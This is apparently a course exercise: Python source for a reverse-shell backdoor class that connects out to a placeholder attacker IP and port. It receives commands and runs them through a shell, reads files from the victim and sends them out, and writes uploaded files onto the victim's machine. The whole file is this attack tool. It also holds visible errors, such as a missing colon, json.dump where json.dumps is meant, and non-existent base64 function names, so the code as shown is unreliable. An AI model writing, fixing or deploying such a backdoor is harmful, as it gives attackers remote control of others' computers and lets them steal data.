#Instead of calling our Class from another program, we will call it from within our code
#that is the only difference in our code

import socket
import subprocess
import json
import os
import base64
import sys

class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port)) #HACKER IP and HACKER PORT
 
	def reliable_send(self, data):
		json_data = json.dump(data)
		self.connection.send(json_data) #change this to self.connection.send(json_data.encode())

	def reliable_receive(self):
		json_data = "" #make this json_data = b"" for python3
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue	

	def execute_system_command(self, command):
		DEVNULL = open(os.devnull, 'wb') #remove for python3
		return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL) #put subprocess. before DEVNULL

	def change_working_directory_to(self, path):
		os.chdir(path)
		return "changing working directory to "+ path

	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.base64decode(content))
			return "upload successful"

	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.base64encode(file.read())

	def run(self)
		while True:
			command = self.reliable_receive() #we will define buffer_size and each time we will be able to revceive a data of 1024 byte
			try:
				if command[0] == "exit":
					self.connection.close()
					sys.exit()
				elif command[0] == "cd" and len(command) > 1:
					self.change_working_directory_to(command[1])
				elif command[0] == "download":
					command_result = self.read_file(command[1]) #command_result = self.read_file(command[1]).decode() for python3
				elif command[0] == "upload":
					command_result = self.write_file(command[1], command[2])
				else:
					command_result =self.execute_system_command(command) #command_result =self.execute_system_command(command).decode() for python3
			except Exception:
				command_result = "Error during command execution"
			
			self.reliable_send(command_result)

my_backdoor = Backdoor("ATTACKER IP", ATTACKER PORT)
my_backdoor.run()